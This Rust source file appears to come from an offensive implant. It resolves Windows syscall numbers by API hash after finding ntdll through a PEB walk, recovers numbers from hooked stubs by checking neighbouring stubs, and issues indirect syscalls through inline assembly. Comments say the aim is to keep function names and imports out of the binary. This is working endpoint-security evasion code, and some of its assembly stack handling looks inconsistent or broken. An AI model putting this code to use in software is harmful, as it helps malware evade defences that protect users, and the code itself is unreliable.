/// Get ntdll base via PEB walk on x64 — no GetModuleHandleA in IAT.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn ntdll_base() -> *const u8 {
    use crate::resolve::api_hash::{peb_get_module_base, h};
    peb_get_module_base(h::DLL_NTDLL)
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn ntdll_base() -> *const u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8
}

/// Look up a syscall number and trampoline pointer by pre-computed hash.
/// Prefer this over `get_ssn` — the string never appears in the binary.
#[cfg(target_os = "windows")]
pub unsafe fn get_ssn_h(name_hash: u32) -> Option<(u16, *const u8)> {
    use crate::resolve::api_hash::resolve_by_hash;
    let ntdll = ntdll_base();
    if ntdll.is_null() { return None; }
    let func_ptr = resolve_by_hash(ntdll, name_hash)?;
    let bytes = core::slice::from_raw_parts(func_ptr, 10);
    let ssn = if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
        u16::from_le_bytes([bytes[4], bytes[5]])
    } else if bytes[0] == 0xE9 {
        find_ssn_neighbour(ntdll, func_ptr)?
    } else {
        return None;
    };
    let trampoline = func_ptr.add(18);
    Some((ssn, trampoline))
}

#[cfg(target_os = "windows")]
pub unsafe fn get_ssn(function_name: &[u8]) -> Option<(u16, *const u8)> {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
    let ntdll = ntdll_base();
    if ntdll.is_null() { return None; }
    let hash = djb2_hash(function_name);
    let func_ptr = resolve_by_hash(ntdll, hash)?;
    let bytes = core::slice::from_raw_parts(func_ptr, 10);
    let ssn = if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
        u16::from_le_bytes([bytes[4], bytes[5]])
    } else if bytes[0] == 0xE9 {
        find_ssn_neighbour(ntdll, func_ptr)?
    } else {
        return None;
    };
    let trampoline = func_ptr.add(18);
    Some((ssn, trampoline))
}

#[cfg(target_os = "windows")]
unsafe fn find_ssn_neighbour(ntdll_base: *const u8, hooked_stub: *const u8) -> Option<u16> {
    for delta in 1u8..=5 {
        for sign in [1i64, -1i64] {
            let candidate = hooked_stub.offset((sign * delta as i64 * 32) as isize);
            let bytes = core::slice::from_raw_parts(candidate, 10);
            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
                let neighbour_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
                let our_ssn = (neighbour_ssn as i32 - (sign as i32 * delta as i32)) as u16;
                return Some(our_ssn);
            }
        }
    }
    None
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(never)]
pub unsafe fn indirect_syscall(
    ssn: u16,
    trampoline: *const u8,
    arg1: usize, arg2: usize, arg3: usize,
    arg4: usize, arg5: usize, arg6: usize,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {tramp}",
        ssn   = in(reg) ssn as u32,
        tramp = in(reg) trampoline,
        in("rcx") arg1, in("rdx") arg2,
        in("r8")  arg3, in("r9")  arg4,
        out("rax") result,
        options(nostack),
    );
    result
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(never)]
pub unsafe fn indirect_syscall_11(
    ssn: u16,
    trampoline: *const u8,
    arg1: usize, arg2: usize, arg3: usize, arg4: usize,
    arg5: usize, arg6: usize, arg7: usize, arg8: usize,
    arg9: usize, arg10: usize, arg11: usize,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov qword ptr [rsp+0x50], {a10}",
        "mov qword ptr [rsp+0x58], {a11}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {tramp}",
        "add rsp, 0x60",
        ssn   = in(reg) ssn as u32,
        tramp = in(reg) trampoline,
        in("rcx") arg1, in("rdx") arg2,
        in("r8")  arg3, in("r9")  arg4,
        a5  = in(reg) arg5,
        a6  = in(reg) arg6,
        a7  = in(reg) arg7,
        a8  = in(reg) arg8,
        a9  = in(reg) arg9,
        a10 = in(reg) arg10,
        a11 = in(reg) arg11,
        out("rax") result,
        options(nostack),
    );
    result
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(never)]
pub unsafe fn indirect_syscall_10(
    ssn: u16,
    trampoline: *const u8,
    arg1: usize, arg2: usize, arg3: usize, arg4: usize,
    arg5: usize, arg6: usize, arg7: usize, arg8: usize,
    arg9: usize, arg10: usize,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "sub rsp, 0x58",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov qword ptr [rsp+0x50], {a10}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {tramp}",
        "add rsp, 0x58",
        ssn   = in(reg) ssn as u32,
        tramp = in(reg) trampoline,
        in("rcx") arg1, in("rdx") arg2,
        in("r8")  arg3, in("r9")  arg4,
        a5  = in(reg) arg5,
        a6  = in(reg) arg6,
        a7  = in(reg) arg7,
        a8  = in(reg) arg8,
        a9  = in(reg) arg9,
        a10 = in(reg) arg10,
        out("rax") result,
        options(nostack),
    );
    result
}
